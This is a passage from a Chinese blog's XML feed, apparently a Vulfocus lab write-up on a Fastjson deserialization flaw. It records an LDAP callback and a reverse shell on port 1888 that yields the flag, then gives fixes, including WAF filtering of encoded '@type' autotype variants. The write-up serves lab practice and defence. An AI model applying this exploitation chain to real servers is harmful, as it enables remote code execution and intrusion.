<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080810.png" alt="image"><br>5. ldap服务收到请求<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080811.png" alt="image"><br>6. 监听的1888端口成功反弹shell，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020080812.png" alt="image"></p>
<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><ol>
<li>升级Fastjson到最新版</li>
<li>WAF拦截过滤请求包中的 @type, %u0040%u0074%u0079%u0070%u0065, \u0040type, \x04type等多种编码的autotype变形</li>
<li>最少升级到1.2.48以上版本且关闭autotype选项</li>
</ol>
]]></content>
      <categories>
        <category>Vulfocus靶场练习</category>
      </categories>
      <tags>
        <tag>Fastjson</tag>
      </tags>
  </entry>
</search>
